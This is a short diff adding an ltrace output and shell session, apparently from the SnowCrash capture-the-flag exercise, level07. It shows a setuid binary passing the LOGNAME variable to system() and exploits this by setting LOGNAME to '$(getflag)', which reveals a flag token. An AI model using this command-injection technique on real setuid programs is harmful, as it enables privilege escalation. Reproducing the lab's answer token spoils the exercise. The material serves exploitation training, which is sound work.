@@ -1,0 +1,16 @@
+__libc_start_main(0x8048514, 1, 0xffb1b464, 0x80485b0 <unfinished ...>
+getegid()                                                   = 1000
+geteuid()                                                   = 1000
+setresgid(1000, 1000, 1000, 1)                              = 0
+setresuid(1000, 1000, 1000, 1)                              = 0
+getenv("LOGNAME")                                           = "flash"
+asprintf(0xffb1b394, 0x8048688, 0xffb1bfe9, 1)              = 16
+system("/bin/echo flash "flash
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                      = 0
++++ exited (status 0) +++
+
+level07@SnowCrash:~$ export LOGNAME='$(getflag)'
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
